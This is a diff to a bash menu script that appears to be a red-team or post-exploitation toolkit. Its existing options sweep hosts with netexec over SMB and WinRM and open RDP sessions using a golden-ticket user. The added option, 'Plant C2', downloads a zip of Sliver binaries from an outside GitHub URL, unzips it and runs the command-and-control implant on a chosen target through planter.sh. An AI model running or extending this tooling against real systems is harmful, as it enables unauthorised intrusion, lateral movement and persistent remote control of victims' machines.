@@ -330,6 +330,7 @@ while true; do
   echo "  6) netexec SMB   (auth sweep all hosts)"
   echo "  7) netexec WinRM (auth sweep all hosts)"
   echo "  8) xfreerdp      (RDP → target)"
+  echo "  c) Plant C2      (download+unzip+exec Sliver → target)"
   echo "  t) Change target host"
   echo "  p) Print all copy-paste commands"
   echo "  9) bash shell    (ticket pre-exported)"
@@ -366,6 +367,17 @@ while true; do
         xfreerdp /v:"\$SELECTED_IP" /d:"\$DOMAIN" /u:"\$GOLDUSER" /cert-ignore
       else
         echo "[-] xfreerdp not found"
+      fi ;;
+    c|C)
+      pick_host 0
+      # Map FQDN back to short hostname for planter
+      local C2_HOST="\${SELECTED_FQDN%%.*}"
+      echo "[*] Planting C2 on \$C2_HOST (\$SELECTED_IP) via planter.sh..."
+      local PLANTER="\$SCRIPT_DIR/planter.sh"
+      if [[ ! -f "\$PLANTER" ]]; then
+        echo "[-] planter.sh not found in \$SCRIPT_DIR"
+      else
+        bash "\$PLANTER" -w "https://github.com/hyper-lang/sliver-binaries/raw/refs/heads/main/patch.zip" "\$TEAM" "\$C2_HOST"
       fi ;;
     t|T)
       pick_host 0
